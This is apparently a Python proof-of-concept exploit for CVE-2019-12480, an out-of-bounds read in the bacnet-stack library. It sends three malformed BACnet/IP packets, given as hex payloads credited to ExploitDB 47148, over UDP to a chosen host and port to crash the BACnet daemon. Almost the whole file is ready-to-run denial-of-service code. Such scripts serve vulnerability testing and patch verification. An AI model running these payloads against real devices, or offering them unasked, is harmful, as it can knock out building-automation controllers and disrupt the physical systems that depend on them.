#!/usr/bin/env python3
"""
CVE-2019-12480 PoC - bacnet-stack <= 0.8.6 OOB read in decode_tag_number().

A malformed BACnet/IP request (DeviceCommunicationControl, AtomicReadFile or
AtomicWriteFile) makes the APDU layer call decode_tag_number() in bacdcode.c on a
truncated tag, reading past the receive buffer. The DeviceCommunicationControl
payload below wanders far enough to SEGV; under the ASan-instrumented build the
daemon aborts. Payloads from ExploitDB 47148 (1modm).

Usage: python3 bacnet_cve_2019_12480_real_poc.py [host] [port]
Raw BVLC frames are sent directly over UDP (the BVLC length field is in-packet).
"""
import socket
import sys
import time

host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
port = int(sys.argv[2]) if len(sys.argv) > 2 else 47808

PAYLOADS = {
    # The killer: malformed DeviceCommunicationControl -> decode_tag_number SEGV.
    "DeviceCommunicationControl": bytes.fromhex(
        "810a00160104000501110dff8000031a0a19002a0041"
    ),
    "AtomicReadFile": bytes.fromhex(
        "810a001b011400050106c4028000000e35ffdf62ee00002205840f"
    ),
    "AtomicWriteFile": bytes.fromhex(
        "810a001b010400050207c4028000000e35ff5ed5c0850a62640a0f"
    ),
}


def main() -> None:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    for name, pkt in PAYLOADS.items():
        print(f"[*] {name} -> {host}:{port} ({len(pkt)} B) {pkt.hex()}")
        s.sendto(pkt, (host, port))
        time.sleep(0.4)
    s.close()
    print("[*] all DoS payloads sent (DeviceCommunicationControl is the trigger)")


if __name__ == "__main__":
    main()
